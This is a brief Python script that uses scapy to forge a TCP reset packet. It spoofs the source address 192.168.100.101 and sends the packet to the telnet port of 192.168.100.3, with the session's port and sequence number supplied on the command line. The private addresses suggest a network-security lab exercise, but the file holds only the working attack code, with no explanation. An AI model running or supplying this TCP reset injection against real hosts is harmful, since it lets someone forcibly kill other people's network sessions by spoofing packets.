#!/usr/bin/python3

import sys
from scapy.all import *

ip = IP(src="192.168.100.101", dst="192.168.100.3")
tcp = TCP(dport=23, sport=int(sys.argv[1]), flags="R", seq=int(sys.argv[2]))
pkt = ip/tcp
ls(pkt)
send(pkt,verbose=0)
